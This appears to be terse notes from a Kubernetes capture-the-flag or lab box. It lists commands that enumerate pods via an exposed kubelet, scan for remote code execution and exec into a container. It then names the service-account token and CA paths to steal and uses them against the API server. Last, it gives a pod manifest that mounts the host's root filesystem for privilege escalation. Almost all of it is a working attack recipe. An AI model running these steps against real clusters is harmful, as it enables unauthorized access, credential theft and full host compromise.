# kubectl
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

chmod +x kubectl
```

# kubeletctl
```bash
wget https://github.com/cyberark/kubeletctl/releases/download/v1.6/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 kubeletctl

./kubeletctl --server 10.129.47.153 pods

./kubeletctl --server 10.129.47.153 scan rce

./kubeletctl --server 10.129.47.153 exec -p nginx -c nginx
```

# Token 
```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 get pods


kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 auth can-i --list

```
## Create a new pod
f.yml:
```yaml
apiVersion: v1
kind: Pod
metadata:
	name: nginxt
	namespace: default
spec:
	containers:
	- name: nginxt
		image: nginx:1.14.2
		volumeMounts:
		- mountPath: /root
			name: mount-root-into-mnt
	volumes:
	- name: mount-root-into-mnt
		hostPath:
			path: /
	automountServiceAccountToken: true
	hostNetwork: true
```
```bash
./kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.47.153:8443 apply -f f.yml 
```



